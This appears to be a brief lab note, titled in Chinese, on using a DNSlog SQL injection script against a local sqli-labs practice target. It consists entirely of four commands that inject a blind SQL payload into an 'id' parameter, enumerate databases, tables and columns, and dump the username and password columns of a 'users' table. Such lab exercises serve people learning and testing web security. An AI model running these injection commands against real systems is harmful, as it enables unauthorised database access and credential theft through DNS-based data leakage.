# 使用脚本 DnslogSqlinj

```shell
python2 dnslogSql.py -u "http://192.168.216.134/sqli-labs-php7/Less-9/?id=1' and ({})--+" --dbs
python2 dnslogSql.py -u "http://192.168.216.134/sqli-labs-php7/Less-9/?id=1' and ({})--+" -D security --tables
python2 dnslogSql.py -u "http://192.168.216.134/sqli-labs-php7/Less-9/?id=1' and ({})--+" -D security -T users --columns
python2 dnslogSql.py -u "http://192.168.216.134/sqli-labs-php7/Less-9/?id=1' and ({})--+" -D security -T users -C username,password --dump
```

